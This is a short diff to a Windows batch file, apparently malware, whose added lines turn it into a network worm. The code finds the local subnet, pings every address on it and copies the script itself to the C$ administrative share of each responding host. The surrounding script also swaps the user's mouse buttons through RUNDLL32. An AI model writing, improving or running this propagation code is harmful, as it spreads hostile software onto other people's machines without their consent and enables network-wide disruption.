@@ -1,8 +1,20 @@
+@echo off
 :user
 :folders
 :files
 :worm
 
+for /f "tokens=2" %%a in ('ipconfig ^| findstr /i "IPv4"') do set ip=%%a
+for /f "tokens=1-3 delims=." %%a in ("%ip%") do set subnet=%%a.%%b.%%c.
+
+for /l %%i in (1,1,254) do (
+    set ip=%subnet%%%i
+    if not "%ip%"=="%subnet%255" (
+        ping -n 1 %ip% | find "TTL=" > nul && (
+            copy /Y %0 "\\%ip%\C$\Users\Public"
+        )
+    )
+)
 
 RUNDLL32 USER32.DLL,SwapMouseButton
 set Slash=\
